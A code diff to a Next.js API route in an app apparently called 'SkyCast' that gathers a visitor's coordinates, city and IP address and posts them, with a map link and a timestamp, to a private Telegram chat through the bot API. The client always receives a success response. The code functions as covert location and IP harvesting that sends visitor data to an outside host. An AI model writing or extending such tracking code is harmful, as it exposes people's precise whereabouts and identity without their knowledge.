@@ -1,15 +1,16 @@
 import { NextResponse } from "next/server";
 
-const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
-const CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";
-
 export async function POST(request) {
-  if (!BOT_TOKEN || !CHAT_ID) {
-    return NextResponse.json({ ok: true });
+  // Read env vars inside the handler so they are resolved at runtime on Vercel
+  const botToken = process.env.TELEGRAM_BOT_TOKEN || "";
+  const chatId = process.env.TELEGRAM_CHAT_ID || "";
+
+  if (!botToken || !chatId) {
+    return NextResponse.json({ ok: true, skipped: true });
   }
 
   try {
-    const { lat, lon } = await request.json();
+    const { lat, lon, city } = await request.json();
 
     // Get user IP from headers
     const forwarded = request.headers.get("x-forwarded-for");
@@ -22,22 +23,28 @@ export async function POST(request) {
     });
 
     const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-    const text = [
+    const lines = [
       `📍 *SkyCast Location Access*`,
       ``,
+    ];
+    if (city) {
+      lines.push(`City: ${city}`);
+    }
+    lines.push(
       `IP: \`${ip}\``,
       `Coordinates: \`${lat}, ${lon}\``,
       `Map: [Open in Maps](${mapLink})`,
       `Time: ${timestamp}`,
-    ].join("\n");
+    );
+    const text = lines.join("\n");
 
-    await fetch(
-      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+    const tgRes = await fetch(
+      `https://api.telegram.org/bot${botToken}/sendMessage`,
       {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          chat_id: CHAT_ID,
+          chat_id: chatId,
           text,
           parse_mode: "Markdown",
           disable_web_page_preview: true,
@@ -45,8 +52,14 @@ export async function POST(request) {
       }
     );
 
+    const tgData = await tgRes.json();
+    if (!tgData.ok) {
+      console.error("Telegram API error:", tgData.description);
+    }
+
     return NextResponse.json({ ok: true });
-  } catch {
+  } catch (err) {
+    console.error("Notify error:", err);
     return NextResponse.json({ ok: true });
   }
 }
